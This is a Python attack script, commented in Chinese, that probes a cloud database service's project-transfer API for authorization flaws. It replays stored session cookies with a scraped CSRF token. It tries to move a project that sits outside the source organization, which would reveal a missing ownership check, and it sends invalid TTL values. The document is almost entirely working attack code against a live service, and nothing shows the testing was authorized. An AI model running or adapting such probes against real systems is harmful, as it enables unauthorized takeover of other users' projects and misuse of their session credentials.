# -*- coding: utf-8 -*-
"""transfer 状态机攻击矩阵:
1. 建炮灰项目(?org_id= query) — 实验床
2. 炮灰: create transfer(ttl=60) -> accept(无 org_id) -> 查归属变化(org->个人?)
   再 create -> accept(org_id=org-flat-dawn) -> 查归属(个人->org 可逆?)
3. ★ org->org transfer: project_ids 含 A(不在 source org) -> 200? = 归属校验缺失
4. ttl 边界: -1 / 0 / 巨大
5. 清理: 删炮灰
"""
import http.client, ssl, json, re, html, sys, os, time, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ORG = 'org-flat-dawn-91601224'
PID_A = 'orange-sun-90493739'

def ctl_req(cookie, method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie.split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=60)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

ck = cookie_str()

def show_proj(pid, label):
    st, raw = ctl_req(ck, 'GET', API_BASE + '/projects/' + pid)
    org = '?'
    try:
        d = json.loads(raw).get('project', {})
        org = d.get('org_id') or d.get('owner', {}).get('org_id') or 'personal?'
    except Exception:
        pass
    print('  [%s] %s -> %d org=%s' % (label, pid, st, org), flush=True)

# 1. 建炮灰项目
name = 'sec-tfr-' + uuid.uuid4().hex[:6]
st, raw = ctl_req(ck, 'POST', API_BASE + '/projects?org_id=%s' % ORG,
                  {'project': {'name': name, 'region_id': 'aws-us-east-2', 'pg_version': 17}})
print('[1] create dummy project -> %d %s' % (st, raw[:300]), flush=True)
dummy = None
try:
    dummy = json.loads(raw).get('project', {}).get('id')
except Exception:
    pass
if not dummy:
    print('  no dummy project; abort matrix on dummy', flush=True)
else:
    print('  dummy = %s' % dummy, flush=True)
    show_proj(dummy, 'dummy-before')

    # 2a. dummy: create -> accept(无 org_id) — org 项目能否转个人
    st, raw = ctl_req(ck, 'POST', API_BASE + '/projects/%s/transfer_requests' % dummy,
                      {'ttl_seconds': 300})
    print('\n[2a] dummy create transfer -> %d %s' % (st, raw[:300]), flush=True)
    req_id = None
    try:
        req_id = json.loads(raw).get('id')
    except Exception:
        pass
    if req_id:
        st, raw = ctl_req(ck, 'PUT', API_BASE + '/projects/%s/transfer_requests/%s' % (dummy, req_id), {})
        print('[2a] accept no-org_id -> %d %s' % (st, raw[:400]), flush=True)
        time.sleep(1)
        show_proj(dummy, 'dummy-after-accept-no-org')

    # 2b. dummy: 若还在 org, create -> accept(org_id=ORG) 语义
    st, raw = ctl_req(ck, 'POST', API_BASE + '/projects/%s/transfer_requests' % dummy,
                      {'ttl_seconds': 300})
    req_id = None
    try:
        req_id = json.loads(raw).get('id')
    except Exception:
        pass
    if req_id:
        st, raw = ctl_req(ck, 'PUT', API_BASE + '/projects/%s/transfer_requests/%s' % (dummy, req_id),
                          {'org_id': ORG})
        print('[2b] accept org_id=ORG -> %d %s' % (st, raw[:400]), flush=True)
        time.sleep(1)
        show_proj(dummy, 'dummy-after-accept-org')

# 3. ★ org->org transfer: project_ids 放 A(不在 source org)
print('\n[3] ★ org->org transfer project_ids 归属校验', flush=True)
for pids, dest in [([PID_A], ORG), ([PID_A], 'org-flat-dawn-00000000'), ([dummy or PID_A], ORG)]:
    st, raw = ctl_req(ck, 'POST', API_BASE + '/organizations/%s/projects/transfer' % ORG,
                      {'destination_org_id': dest, 'project_ids': pids})
    print('  pids=%s dest=%s -> %d %s' % (pids, dest, st, raw[:250]), flush=True)
    time.sleep(0.5)

# 4. ttl 边界
print('\n[4] ttl 边界', flush=True)
for ttl in [-1, 0, 99999999999999]:
    st, raw = ctl_req(ck, 'POST', API_BASE + '/projects/%s/transfer_requests' % PID_A,
                      {'ttl_seconds': ttl})
    print('  ttl=%s -> %d %s' % (ttl, st, raw[:250]), flush=True)
    time.sleep(0.5)

# 5. 清理
if dummy:
    st, raw = ctl_req(ck, 'DELETE', API_BASE + '/projects/%s' % dummy)
    print('\n[5] cleanup dummy -> %d %s' % (st, raw[:200]), flush=True)
show_proj(PID_A, 'A-project-final')
